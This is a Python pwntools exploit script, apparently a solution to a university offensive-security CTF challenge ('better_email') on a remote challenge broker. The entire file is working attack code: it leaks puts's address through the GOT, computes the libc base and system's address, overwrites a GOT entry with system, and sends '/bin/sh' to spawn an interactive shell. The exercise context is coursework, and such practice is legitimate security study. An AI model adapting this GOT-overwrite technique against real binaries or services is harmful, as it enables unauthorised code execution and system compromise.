from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"
context.os = "linux"
target_file = "./better_email"

LOCAL = False

if LOCAL:
    p = process(target_file)
    # p = gdb.debug(target_file, '''
    # b main
    # continue
    # ''', aslr=False)
    libc = "/lib/x86_64-linux-gnu/libc.so.6"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1296)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./libc.so.6"

target_elf = ELF(target_file, checksec=False)
glibc_elf = ELF(libc, checksec=False)

p.recvuntil(b'From: ')
puts_got_address = 0x00404018
puts_glib_offset = glibc_elf.symbols.puts

print(f"puts offset: {hex(puts_got_address)}")
print(f'puts_got_address: {hex(puts_got_address)}')

p.send(p64(puts_got_address))
puts_address = u64(p.recvline().strip())
print(f'puts address: {hex(puts_address)}')

base_address = puts_address - puts_glib_offset
print(f'Base address: {hex(base_address)}')
system_address = base_address + glibc_elf.symbols.system
print(f'system address: {hex(system_address)}')

p.recvuntil(b'To: ')
p.send(p64(system_address) + p64(puts_got_address))
p.recvuntil(b'Message: ')
p.send(b'/bin/sh\x00')

p.interactive()